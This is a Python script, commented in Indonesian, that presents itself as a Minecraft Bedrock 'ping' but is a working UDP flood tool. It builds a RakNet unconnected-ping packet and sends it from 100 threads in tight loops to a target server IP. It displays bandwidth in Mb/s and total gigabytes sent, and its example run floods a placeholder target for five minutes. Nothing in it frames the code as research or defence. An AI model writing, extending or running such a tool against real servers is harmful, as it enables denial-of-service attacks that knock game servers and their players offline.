from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep
import struct
import os

# Definisi warna secara global
white = '\033[97m'
fluo = '\033[92m'  # Hijau terang
purple = '\033[95m'
reset = '\033[0m'

# Mencoba impor pystyle jika tersedia
try:
    from pystyle import *
except ImportError:
    # Jika tidak tersedia, gunakan definisi warna yang sudah dibuat
    pass

class MinecraftBedrockPing:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port or 19132  # Default Bedrock Edition port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.client.settimeout(3)
        self.data = self._create_raknet_ping_packet()
        self.len = len(self.data)
        
    def _create_raknet_ping_packet(self):
        # RakNet Protocol - Unconnected Ping packet format for MCPE/Bedrock
        # 0x01 - Unconnected Ping
        # Long: Timestamp
        # Magic: 00 FF FF 00 FE FE FE FE FD FD FD FD 12 34 56 78
        
        magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
        timestamp = int(time() * 1000)  # Current timestamp in milliseconds
        
        # Construct the packet
        packet = b'\x01'  # ID for Unconnected Ping
        packet += struct.pack('>Q', timestamp)  # Big-endian unsigned long long
        packet += magic
        packet += struct.pack('>L', self.force)  # Client GUID (using force as GUID)
        
        return packet
    
    def flood(self):
        self.on = True
        self.sent = 0
        self.received = 0
        
        for _ in range(self.threads):
            Thread(target=self.send).start()
        
        Thread(target=self.info).start()
        Thread(target=self.receive).start()
    
    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        bytediff = 8
        mb = 1000000
        gb = 1000000000
        
        while self.on:
            try:
                sleep(interval)
                if not self.on:
                    break
                if size != 0:
                    self.total += self.sent * bytediff / gb * interval
                    print(f"{fluo}{round(size)}{white} Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)}{white} Gb. {purple}-{white} Responses: {fluo}{self.received}{reset}{' '*20}", end='\r')
                now2 = time()
            
                if now + 1 >= now2:
                    continue
                
                size = round(self.sent * bytediff / mb)
                self.sent = 0
                now += 1
            except Exception as e:
                print(f"\nError in info thread: {e}")
                break
    
    def stop(self):
        self.on = False
    
    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self.port))
                self.sent += self.len
            except:
                pass
    
    def receive(self):
        self.client.settimeout(1)
        while self.on:
            try:
                data, addr = self.client.recvfrom(2048)
                if data:
                    self.received += 1
                    if self.received == 1:  # Print server info on first response
                        self._parse_server_info(data)
            except:
                pass
    
    def _parse_server_info(self, data):
        """Parse and display Bedrock server information from response"""
        try:
            if len(data) > 0 and data[0] == 0x1C:  # Unconnected Pong
                offset = 35  # Skip header, timestamp, server GUID, and magic
                server_info = data[offset:].decode('utf-8', errors='ignore').split(';')
                
                if len(server_info) >= 6:
                    print("\n" + "-" * 50)
                    print(f"Server Name: {server_info[1]}")
                    print(f"Protocol Version: {server_info[2]}")
                    print(f"Version: {server_info[3]}")
                    print(f"Players: {server_info[4]}/{server_info[5]}")
                    if len(server_info) > 7:
                        print(f"Game Mode: {server_info[8]}")
                    print("-" * 50)
        except Exception as e:
            print(f"\nError parsing server info: {e}")


# Example usage
if __name__ == "__main__":
    ip = "ip"  # Replace with target server IP
    port = 19132  # Default Minecraft server port 
    ping = MinecraftBedrockPing(ip, port, force=5000, threads=100)
    print(f"Starting Minecraft Bedrock ping to {ip}:{port}")
    ping.flood()
    
    try:
        # Run for some time then stop
        sleep(300)
        ping.stop()
        print("\nStopped pinging")
    except KeyboardInterrupt:
        ping.stop()
        print("\nStopped pinging")
